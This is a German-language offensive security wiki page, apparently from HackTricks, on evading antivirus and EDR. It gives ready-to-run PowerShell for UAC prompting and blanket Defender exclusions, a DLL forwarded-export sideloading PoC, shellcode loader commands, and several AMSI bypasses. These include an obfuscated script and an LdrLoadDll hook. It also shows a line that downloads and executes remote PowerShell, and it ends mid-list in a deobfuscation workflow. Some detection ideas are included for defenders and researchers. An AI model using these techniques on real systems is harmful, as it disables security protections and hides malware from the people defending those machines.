# Antivirus (AV) Bypass

{{#include ../banners/hacktricks-training.md}}

**Diese Seite wurde ursprünglich von** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Stop Defender

- [defendnot](https://github.com/es3n1n/defendnot): Ein Tool, um Windows Defender daran zu hindern, zu funktionieren.
- [no-defender](https://github.com/es3n1n/no-defender): Ein Tool, um Windows Defender daran zu hindern, zu funktionieren, indem ein anderer AV vorgetäuscht wird.
- [Disable Defender if you are admin](basic-powershell-for-pentesters/README.md)

### Installer-style UAC bait before tampering with Defender

Public loaders, die sich als Game Cheats tarnen, werden häufig als unsignierte Node.js/Nexe-Installer ausgeliefert, die zuerst **den Benutzer um Erhöhung der Rechte bitten** und erst danach Defender deaktivieren. Der Ablauf ist einfach:

1. Mit `net session` den administrativen Kontext prüfen. Der Befehl ist nur erfolgreich, wenn der Aufrufer über Admin-Rechte verfügt; ein Fehlschlag bedeutet also, dass der Loader als Standardbenutzer läuft.
2. Sich sofort mit dem `RunAs`-Verb neu starten, um die erwartete UAC-Zustimmungsaufforderung auszulösen und dabei die ursprüngliche Befehlszeile beizubehalten.
```powershell
if (-not (net session 2>$null)) {
powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
exit
}
```
Opfer glauben bereits, dass sie „cracked“ Software installieren, daher wird die Abfrage meist akzeptiert, wodurch die Malware die Rechte erhält, die sie braucht, um die Richtlinie von Defender zu ändern.

### Pauschale `MpPreference`-Ausschlüsse für jeden Laufwerksbuchstaben

Nach der Erhöhung der Rechte maximieren GachiLoader-ähnliche Ketten die blinden Flecken von Defender, statt den Dienst direkt zu deaktivieren. Der Loader beendet zuerst den GUI-Watchdog (`taskkill /F /IM SecHealthUI.exe`) und setzt dann **extrem weit gefasste Ausschlüsse**, sodass jedes Benutzerprofil, jedes Systemverzeichnis und jedes Wechsellaufwerk nicht mehr gescannt werden kann:
```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```
Schlüsselbeobachtungen:

- Die Schleife durchläuft jedes gemountete Dateisystem (D:\, E:\, USB-Sticks usw.), daher wird **jede zukünftige Payload, die irgendwo auf der Festplatte abgelegt wird, ignoriert**.
- Der `.sys`-Extension-Ausschluss ist vorausschauend – Angreifer behalten sich die Option vor, später unsignierte Treiber zu laden, ohne Defender erneut anzufassen.
- Alle Änderungen landen unter `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions`, sodass spätere Stufen bestätigen können, dass die Exclusions bestehen bleiben, oder sie ohne erneutes UAC-Triggern erweitern können.

Da kein Defender-Dienst gestoppt wird, melden naive Health-Checks weiterhin „antivirus aktiv“, obwohl die Echtzeitprüfung diese Pfade nie berührt.

## **AV Evasion Methodology**

Derzeit verwenden AVs verschiedene Methoden, um zu prüfen, ob eine Datei bösartig ist oder nicht: static detection, dynamic analysis und bei den fortgeschritteneren EDRs behavioural analysis.

### **Static detection**

Static detection erfolgt durch das Markieren bekannter bösartiger Strings oder Byte-Arrays in einer Binärdatei oder einem Skript sowie durch das Extrahieren von Informationen aus der Datei selbst (z. B. file description, company name, digital signatures, icon, checksum usw.). Das bedeutet, dass die Verwendung bekannter öffentlicher Tools dazu führen kann, dass du leichter auffällst, da sie wahrscheinlich bereits analysiert und als bösartig markiert wurden. Es gibt einige Möglichkeiten, diese Art von Detection zu umgehen:

- **Encryption**

Wenn du die Binärdatei verschlüsselst, kann AV dein Programm nicht erkennen, aber du brauchst irgendeinen Loader, der das Programm im Speicher entschlüsselt und ausführt.

- **Obfuscation**

Manchmal reicht es, einige Strings in deiner Binärdatei oder deinem Skript zu verändern, um AV daran vorbeizubringen, aber das kann je nach dem, was du obfuskieren willst, zeitaufwendig sein.

- **Custom tooling**

Wenn du deine eigenen Tools entwickelst, gibt es keine bekannten bösartigen Signaturen, aber das kostet viel Zeit und Aufwand.

> [!TIP]
> Eine gute Möglichkeit, Windows Defender auf static detection zu prüfen, ist [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). Es teilt die Datei im Grunde in mehrere Segmente auf und lässt Defender dann jedes einzeln scannen; so kann es dir genau sagen, welche Strings oder Bytes in deiner Binärdatei markiert werden.

Ich empfehle dir sehr, dir diese [YouTube playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) über praktische AV Evasion anzusehen.

### **Dynamic analysis**

Dynamic analysis bedeutet, dass AV deine Binärdatei in einer Sandbox ausführt und auf bösartiges Verhalten achtet (z. B. versuchen, die Passwörter deines Browsers zu entschlüsseln und auszulesen, einen minidump auf LSASS durchführen usw.). Dieser Teil kann etwas schwieriger zu handhaben sein, aber hier sind einige Dinge, die du tun kannst, um Sandboxes zu umgehen.

- **Sleep before execution** Je nachdem, wie es implementiert ist, kann das eine großartige Möglichkeit sein, die dynamic analysis von AV zu umgehen. AVs haben nur sehr wenig Zeit, Dateien zu scannen, damit der Workflow des Nutzers nicht unterbrochen wird; lange Sleeps können daher die Analyse von Binärdateien stören. Das Problem ist, dass viele AV-Sandboxes den Sleep einfach überspringen können, je nachdem, wie er implementiert ist.
- **Checking machine's resources** Normalerweise haben Sandboxes nur sehr wenige Ressourcen zur Verfügung (z. B. < 2 GB RAM), sonst könnten sie die Maschine des Nutzers verlangsamen. Hier kannst du auch sehr kreativ werden, zum Beispiel indem du die CPU-Temperatur oder sogar die Lüfterdrehzahlen prüfst; nicht alles wird in der Sandbox implementiert sein.
- **Machine-specific checks** Wenn du einen Nutzer angreifen willst, dessen Workstation der Domäne "contoso.local" beigetreten ist, kannst du die Domäne des Computers prüfen, um zu sehen, ob sie mit der von dir angegebenen übereinstimmt; wenn nicht, kannst du dein Programm beenden lassen.

Es stellt sich heraus, dass der Sandbox-Computername von Microsoft Defender HAL9TH ist. Du kannst also vor der Ausführung in deinem malware den Computernamen prüfen; wenn der Name HAL9TH ist, bedeutet das, dass du dich in der Sandbox von Defender befindest, also kannst du dein Programm beenden lassen.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>source: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Einige weitere sehr gute Tipps von [@mgeeky](https://twitter.com/mariuszbit) für den Umgang mit Sandboxes

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev channel</p></figcaption></figure>

Wie wir in diesem Post schon gesagt haben, werden **public tools** früher oder später **detected**, also solltest du dir etwas fragen:

Wenn du zum Beispiel LSASS dumpen willst, **musst du wirklich mimikatz verwenden**? Oder könntest du ein anderes Projekt verwenden, das weniger bekannt ist und ebenfalls LSASS dumpt.

Die richtige Antwort ist wahrscheinlich Letzteres. Nimmt man mimikatz als Beispiel, ist es wahrscheinlich eines der am stärksten von AVs und EDRs markierten malware-Stücke, wenn nicht sogar das am stärksten markierte; das Projekt selbst ist zwar super cool, aber damit um AVs herumzukommen, ist auch ein Albtraum. Suche also einfach nach Alternativen für das, was du erreichen willst.

> [!TIP]
> Wenn du deine Payloads für Evasion modifizierst, achte darauf, in defender die **automatic sample submission** auszuschalten, und bitte, wirklich, **NICHT AUF VIRUSTOTAL HOCHLADEN**, wenn dein Ziel ist, langfristig Evasion zu erreichen. Wenn du prüfen willst, ob deine Payload von einem bestimmten AV erkannt wird, installiere ihn in einer VM, versuche die automatische Sample-Einreichung auszuschalten, und teste dort, bis du mit dem Ergebnis zufrieden bist.

## EXEs vs DLLs

Wann immer es möglich ist, solltest du für Evasion immer **die Verwendung von DLLs priorisieren**; meiner Erfahrung nach werden DLL-Dateien meist **deutlich weniger erkannt** und analysiert, also ist das in manchen Fällen ein sehr einfacher Trick, um Detection zu vermeiden (wenn deine Payload natürlich auf irgendeine Weise als DLL ausgeführt werden kann).

Wie wir in diesem Bild sehen können, hat eine DLL-Payload von Havoc eine Detection-Rate von 4/26 auf antiscan.me, während die EXE-Payload eine Detection-Rate von 7/26 hat.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>antiscan.me comparison of a normal Havoc EXE payload vs a normal Havoc DLL</p></figcaption></figure>

Jetzt zeigen wir einige Tricks, die du mit DLL-Dateien verwenden kannst, um deutlich stealthier zu sein.

## DLL Sideloading & Proxying

**DLL Sideloading** nutzt die DLL-Suchreihenfolge des Loaders aus, indem sowohl die Zielanwendung als auch die bösartige(n) Payload(s) nebeneinander platziert werden.

Du kannst nach Programmen suchen, die anfällig für DLL Sideloading sind, mit [Siofra](https://github.com/Cybereason/siofra) und folgendem powershell-Skript:
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
Dieser Befehl gibt die Liste der Programme aus, die in "C:\Program Files\\" für DLL hijacking anfällig sind, sowie die DLL-Dateien, die sie zu laden versuchen.

Ich empfehle dringend, dass du **DLL Hijackable/Sideloadable programs selbst erkundest**, diese Technik ist ziemlich stealthy, wenn sie richtig gemacht wird, aber wenn du öffentlich bekannte DLL Sideloadable programs verwendest, kannst du leicht erwischt werden.

Nur indem du eine bösartige DLL mit dem Namen ablegst, den ein Programm erwartet zu laden, wird dein Payload nicht geladen, da das Programm bestimmte spezifische Funktionen innerhalb dieser DLL erwartet. Um dieses Problem zu beheben, verwenden wir eine andere Technik namens **DLL Proxying/Forwarding**.

**DLL Proxying** leitet die Aufrufe, die ein Programm von der Proxy- (und bösartigen) DLL an die Original-DLL macht, weiter, wodurch die Funktionalität des Programms erhalten bleibt und die Ausführung deines Payloads ermöglicht wird.

Ich werde das [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) Projekt von [@flangvik](https://twitter.com/Flangvik/) verwenden

Dies sind die Schritte, denen ich gefolgt bin:
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
Der letzte Befehl wird uns 2 Dateien geben: eine DLL-Quellcodevorlage und die ursprünglich umbenannte DLL.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
Diese sind die Ergebnisse:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Sowohl unser shellcode (kodiert mit [SGN](https://github.com/EgeBalci/sgn)) als auch die proxy DLL haben eine Erkennungsrate von 0/26 auf [antiscan.me](https://antiscan.me)! Ich würde das als Erfolg bezeichnen.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Ich **empfehle sehr**, dass du dir die [Twitch-VOD von S3cur3Th1sSh1t](https://www.twitch.tv/videos/1644171543) zu DLL Sideloading und auch [ippsecs Video](https://www.youtube.com/watch?v=3eROsG_WNpE) ansiehst, um mehr darüber zu lernen, was wir hier ausführlicher besprochen haben.

### Missbrauch von Forwarded Exports (ForwardSideLoading)

Windows PE-Module können Funktionen exportieren, die eigentlich "forwarders" sind: Statt auf Code zu zeigen, enthält der Export-Eintrag einen ASCII-String der Form `TargetDll.TargetFunc`. Wenn ein Aufrufer den Export auflöst, wird der Windows-Loader:

- `TargetDll` laden, falls es nicht bereits geladen ist
- `TargetFunc` daraus auflösen

Wichtige Verhaltensweisen, die man verstehen sollte:
- Wenn `TargetDll` eine KnownDLL ist, wird sie aus dem geschützten KnownDLLs-Namespace bereitgestellt (z. B. ntdll, kernelbase, ole32).
- Wenn `TargetDll` keine KnownDLL ist, wird die normale DLL-Suchreihenfolge verwendet, die das Verzeichnis des Moduls einschließt, das die Forward-Auflösung durchführt.

Dies ermöglicht ein indirektes sideloading-Primitive: Finde eine signierte DLL, die eine Funktion exportiert, die auf ein Nicht-KnownDLL-Modulnamen weitergeleitet wird, und lege diese signierte DLL zusammen mit einer vom Angreifer kontrollierten DLL ab, die exakt so benannt ist wie das weitergeleitete Zielmodul. Wenn der forwarded export aufgerufen wird, löst der Loader den forward auf und lädt deine DLL aus demselben Verzeichnis, wodurch dein DllMain ausgeführt wird.

Beispiel unter Windows 11:
```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```
`NCRYPTPROV.dll` ist kein KnownDLL, daher wird es über die normale Suchreihenfolge aufgelöst.

PoC (copy-paste):
1) Kopiere die signierte System-DLL in einen beschreibbaren Ordner
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Lege eine bösartige `NCRYPTPROV.dll` im selben Ordner ab. Ein minimales DllMain reicht aus, um Codeausführung zu erhalten; du musst die weitergeleitete Funktion nicht implementieren, um DllMain auszulösen.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
if (reason == DLL_PROCESS_ATTACH){
HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}
}
return TRUE;
}
```
3) Den forward mit einem signierten LOLBin auslösen:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```
Beobachtetes Verhalten:
- rundll32 (signed) lädt die side-by-side `keyiso.dll` (signed)
- Beim Auflösen von `KeyIsoSetAuditingInterface` folgt der Loader dem Forward zu `NCRYPTPROV.SetAuditingInterface`
- Der Loader lädt dann `NCRYPTPROV.dll` aus `C:\test` und führt dessen `DllMain` aus
- Wenn `SetAuditingInterface` nicht implementiert ist, erhältst du einen "missing API"-Fehler erst, nachdem `DllMain` bereits ausgeführt wurde

Hunting-Tipps:
- Konzentriere dich auf forwarded exports, bei denen das Zielmodul kein KnownDLL ist. KnownDLLs sind unter `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs` aufgelistet.
- Du kannst forwarded exports mit Tools wie diesen auflisten:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Siehe das Windows 11 forwarder inventory, um nach Kandidaten zu suchen: https://hexacorn.com/d/apis_fwd.txt

Detection/defense-Ideen:
- Überwache LOLBins (z. B. rundll32.exe), die signierte DLLs aus Nicht-Systempfaden laden, gefolgt vom Laden von non-KnownDLLs mit demselben Basisnamen aus diesem Verzeichnis
- Löse Alarme bei Prozess-/Modul-Ketten wie: `rundll32.exe` → Nicht-System-`keyiso.dll` → `NCRYPTPROV.dll` unter benutzerbeschreibbaren Pfaden aus
- Erzwinge Code-Integrity-Policies (WDAC/AppLocker) und verbiete write+execute in Anwendungsverzeichnissen

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods`

Du kannst Freeze verwenden, um deinen shellcode auf stealthy Weise zu laden und auszuführen.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Evasion ist nur ein Katz-und-Maus-Spiel; was heute funktioniert, kann morgen erkannt werden. Verlass dich daher nie nur auf ein einziges Tool, und wenn möglich, kombiniere mehrere Evasion-Techniken.

## Direct/Indirect Syscalls & SSN Resolution (SysWhispers4)

EDRs platzieren oft **user-mode inline hooks** auf `ntdll.dll` syscall stubs. Um diese Hooks zu umgehen, kannst du **direct** oder **indirect** syscall stubs erzeugen, die die korrekte **SSN** (System Service Number) laden und in den Kernel-Modus wechseln, ohne den gehookten Export-Entrypoint auszuführen.

**Invocation options:**
- **Direct (embedded)**: eine `syscall`/`sysenter`/`SVC #0`-Instruktion in den generierten Stub einbetten (kein `ntdll` export hit).
- **Indirect**: in ein vorhandenes `syscall`-Gadget innerhalb von `ntdll` springen, sodass der Kernel-Übergang scheinbar aus `ntdll` stammt (nützlich für heuristic evasion); **randomized indirect** wählt pro Aufruf ein Gadget aus einem Pool.
- **Egg-hunt**: die statische `0F 05`-Opcode-Sequenz nicht auf der Platte einbetten; zur Laufzeit eine syscall sequence auflösen.

**Hook-resistant SSN resolution strategies:**
- **FreshyCalls (VA sort)**: SSNs ableiten, indem syscall stubs nach ihrer virtuellen Adresse sortiert werden, statt Stub-Bytes zu lesen.
- **SyscallsFromDisk**: ein sauberes `\KnownDlls\ntdll.dll` mappen, SSNs aus dessen `.text` lesen und dann unmapen (umgeht alle In-Memory-Hooks).
- **RecycledGate**: VA-sortierte SSN-Inferenz mit Opcode-Validierung kombinieren, wenn ein Stub sauber ist; bei gehookten Stubs auf VA-Inferenz zurückfallen.
- **HW Breakpoint**: DR0 auf die `syscall`-Instruktion setzen und eine VEH verwenden, um die SSN zur Laufzeit aus `EAX` zu erfassen, ohne gehookte Bytes zu parsen.

Example SysWhispers4 usage:
```bash
# Indirect syscalls + hook-resistant resolution
python syswhispers.py --preset injection --method indirect --resolve recycled

# Resolve SSNs from a clean on-disk ntdll
python syswhispers.py --preset injection --method indirect --resolve from_disk --unhook-ntdll

# Hardware breakpoint SSN extraction
python syswhispers.py --functions NtAllocateVirtualMemory,NtCreateThreadEx --resolve hw_breakpoint
```
## AMSI (Anti-Malware Scan Interface)

AMSI wurde entwickelt, um "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)" zu verhindern. Anfangs waren AVs nur in der Lage, **Dateien auf der Festplatte** zu scannen, also hätte ein AV nichts tun können, um es zu verhindern, wenn du Payloads irgendwie **direkt im Speicher** ausführen konntest, da es nicht genug Sichtbarkeit hatte.

Die AMSI-Funktion ist in diese Windows-Komponenten integriert.

- User Account Control, oder UAC (Elevation von EXE-, COM-, MSI- oder ActiveX-Installation)
- PowerShell (Scripts, interaktive Nutzung und dynamische Codeauswertung)
- Windows Script Host (wscript.exe und cscript.exe)
- JavaScript und VBScript
- Office VBA macros

Es ermöglicht Antivirus-Lösungen, das Verhalten von Scripts zu untersuchen, indem der Script-Inhalt in einer Form offengelegt wird, die sowohl unverschlüsselt als auch nicht obfuskiert ist.

Die Ausführung von `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` erzeugt den folgenden Alert auf Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Beachte, wie es `amsi:` voranstellt und dann den Pfad zur ausführbaren Datei, von der das Script ausgeführt wurde; in diesem Fall powershell.exe

Wir haben keine Datei auf die Festplatte geschrieben, wurden aber trotzdem im Speicher durch AMSI erwischt.

Außerdem wird ab **.NET 4.8** auch C#-Code durch AMSI ausgeführt. Das betrifft sogar `Assembly.Load(byte[])`, um in-memory execution zu laden. Deshalb wird empfohlen, für in-memory execution niedrigere Versionen von .NET (wie 4.7.2 oder darunter) zu verwenden, wenn du AMSI umgehen willst.

Es gibt ein paar Möglichkeiten, AMSI zu umgehen:

- **Obfuscation**

Da AMSI hauptsächlich mit statischen Erkennungen arbeitet, kann das Modifizieren der Scripts, die du laden willst, eine gute Methode sein, um Erkennung zu umgehen.

Allerdings hat AMSI die Fähigkeit, Scripts zu deobfuskieren, selbst wenn sie mehrere Ebenen haben, sodass Obfuscation je nach Umsetzung eine schlechte Option sein kann. Dadurch ist das Umgehen nicht ganz so einfach. Manchmal reicht es jedoch schon, ein paar Variablennamen zu ändern, und alles ist gut; es hängt also davon ab, wie stark etwas bereits markiert wurde.

- **AMSI Bypass**

Da AMSI implementiert ist, indem eine DLL in den Prozess von powershell (auch cscript.exe, wscript.exe usw.) geladen wird, ist es möglich, es selbst als unprivilegierter Benutzer leicht zu manipulieren. Aufgrund dieses Fehlers in der Implementierung von AMSI haben Forscher mehrere Wege gefunden, AMSI-Scanning zu umgehen.

**Forcing an Error**

Das Erzwingen eines Fehlschlags bei der AMSI-Initialisierung (amsiInitFailed) führt dazu, dass für den aktuellen Prozess kein Scan initiiert wird. Ursprünglich wurde dies von [Matt Graeber](https://twitter.com/mattifestation) offengelegt, und Microsoft hat eine Signatur entwickelt, um die weitere Verbreitung zu verhindern.
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
Alles, was nötig war, war eine Zeile PowerShell-Code, um AMSI für den aktuellen PowerShell-Prozess unbrauchbar zu machen. Diese Zeile wurde natürlich von AMSI selbst erkannt, daher ist eine Anpassung nötig, um diese Technik zu verwenden.

Hier ist ein modifizierter AMSI-bypass, den ich aus diesem [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db) genommen habe.
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
Beachten Sie, dass dies wahrscheinlich markiert wird, sobald dieser Beitrag veröffentlicht wird, daher sollten Sie keinen Code veröffentlichen, wenn Ihr Plan ist, unentdeckt zu bleiben.

**Memory Patching**

Diese Technik wurde ursprünglich von [@RastaMouse](https://twitter.com/_RastaMouse/) entdeckt und besteht darin, die Adresse der Funktion "AmsiScanBuffer" in amsi.dll zu finden (die für das Scannen der vom Benutzer bereitgestellten Eingaben verantwortlich ist) und sie mit Instruktionen zu überschreiben, die den Code für E_INVALIDARG zurückgeben. Auf diese Weise gibt das Ergebnis des eigentlichen Scans 0 zurück, was als sauberes Ergebnis interpretiert wird.

> [!TIP]
> Bitte lesen Sie [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) für eine detailliertere Erklärung.

Es gibt auch viele andere Techniken, um AMSI mit powershell zu umgehen, schauen Sie sich [**diese Seite**](basic-powershell-for-pentesters/index.html#amsi-bypass) und [**dieses Repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) an, um mehr darüber zu erfahren.

### Blockieren von AMSI, indem das Laden von amsi.dll verhindert wird (LdrLoadDll Hook)

AMSI wird erst initialisiert, nachdem `amsi.dll` in den aktuellen Prozess geladen wurde. Ein robuster, sprachunabhängiger Bypass besteht darin, einen User-Mode-Hook auf `ntdll!LdrLoadDll` zu setzen, der einen Fehler zurückgibt, wenn das angeforderte Modul `amsi.dll` ist. Dadurch wird AMSI nie geladen und es erfolgen keine Scans für diesen Prozess.

Implementierungsübersicht (x64 C/C++ Pseudocode):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
if (module && module->Buffer){
UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
if (RtlEqualUnicodeString(module, &amsi, TRUE)){
// Pretend the DLL cannot be found → AMSI never initialises in this process
return STATUS_DLL_NOT_FOUND; // 0xC0000135
}
}
return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
// Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
// e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Notes
- Funktioniert gleichermaßen mit PowerShell, WScript/CScript und benutzerdefinierten Loaders (alles, was sonst AMSI laden würde).
- Kombiniere das mit dem Einspeisen von Scripts über stdin (`PowerShell.exe -NoProfile -NonInteractive -Command -`), um lange Command-Line-Artefakte zu vermeiden.
- Wurde bei Loaders gesehen, die über LOLBins ausgeführt werden (z. B. `regsvr32`, das `DllRegisterServer` aufruft).

The tool **[https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail)** generiert ebenfalls Script, um AMSI zu umgehen.
The tool **[https://amsibypass.com/](https://amsibypass.com/)** generiert ebenfalls Script, um AMSI zu umgehen, das Signaturen durch randomisierte, vom Benutzer definierte Funktionen, Variablen, Zeichen-Ausdrücke vermeidet und zufällige Groß-/Kleinschreibung bei PowerShell-Keywords anwendet, um Signaturen zu vermeiden.

**Remove the detected signature**

Du kannst ein Tool wie **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** und **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** verwenden, um die erkannte AMSI-Signatur aus dem Speicher des aktuellen Prozesses zu entfernen. Dieses Tool funktioniert, indem es den Speicher des aktuellen Prozesses nach der AMSI-Signatur durchsucht und sie dann mit NOP-Instruktionen überschreibt, wodurch sie effektiv aus dem Speicher entfernt wird.

**AV/EDR products that uses AMSI**

Du kannst eine Liste von AV/EDR-Produkten, die AMSI verwenden, in **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)** finden.

**Use Powershell version 2**
Wenn du PowerShell version 2 verwendest, wird AMSI nicht geladen, sodass du deine Scripts ausführen kannst, ohne dass sie von AMSI gescannt werden. Du kannst dies tun:
```bash
powershell.exe -version 2
```
## PS Logging

PowerShell-Logging ist eine Funktion, mit der du alle PowerShell-Befehle protokollieren kannst, die auf einem System ausgeführt werden. Das kann für Audit- und Troubleshooting-Zwecke nützlich sein, aber es kann auch ein **Problem für Angreifer sein, die Erkennung umgehen wollen**.

Um PowerShell-Logging zu umgehen, kannst du die folgenden Techniken verwenden:

- **PowerShell Transcription und Module Logging deaktivieren**: Du kannst dafür ein Tool wie [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) verwenden.
- **PowerShell version 2 verwenden**: Wenn du PowerShell version 2 verwendest, wird AMSI nicht geladen, sodass du deine Skripte ausführen kannst, ohne von AMSI gescannt zu werden. Du kannst das so machen: `powershell.exe -version 2`
- **Eine unmanaged PowerShell-Session verwenden**: Verwende [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell), um eine powershell ohne defenses zu starten (das ist, was `powerpick` von Cobal Strike verwendet).


## Obfuscation

> [!TIP]
> Mehrere Obfuscation-Techniken beruhen darauf, Daten zu verschlüsseln, was die Entropie der Binärdatei erhöht und es AVs und EDRs erleichtert, sie zu erkennen. Sei damit vorsichtig und verschlüssele vielleicht nur bestimmte Bereiche deines Codes, die sensibel sind oder verborgen werden müssen.

### Deobfuscating ConfuserEx-Protected .NET Binaries

Wenn du Malware analysierst, die ConfuserEx 2 (oder kommerzielle Forks) verwendet, stößt du häufig auf mehrere Schutzschichten, die Decompiler und Sandboxes blockieren. Der folgende Workflow stellt zuverlässig eine **nahezu ursprüngliche IL** wieder her, die anschließend mit Tools wie dnSpy oder ILSpy zu C# dekompiliert werden kann.

1.  Anti-tampering removal – ConfuserEx verschlüsselt jeden *method body* und entschlüsselt ihn im statischen Konstruktor des *module* (`<Module>.cctor`). Dadurch wird auch die PE-Checksumme gepatcht, sodass jede Änderung die Binärdatei zum Absturz bringt. Verwende **AntiTamperKiller**, um die verschlüsselten Metadatentabellen zu lokalisieren, die XOR-Keys wiederherzustellen und eine saubere Assembly neu zu schreiben:
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
Die Ausgabe enthält die 6 Anti-Tamper-Parameter (`key0-key3`, `nameHash`, `internKey`), die nützlich sein können, wenn du deinen eigenen Unpacker baust.

2.  Symbol / control-flow recovery – gib die *saubere* Datei an **de4dot-cex** weiter (ein ConfuserEx-bewusster Fork von de4dot).
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
Flags:
• `-p crx` – wähle das ConfuserEx 2-Profil
• de4dot macht Control-Flow-Flattening rückgängig, stellt ursprüngliche Namespaces, Klassen und Variablennamen wieder her und entschlüsselt konstante Strings.

3.  Proxy-call stripping – ConfuserEx ersetzt direkte Method Calls durch leichte Wrapper (auch *proxy calls* genannt), um die Dekomplilierung weiter zu erschweren. Entferne sie mit **ProxyCall-Remover**:
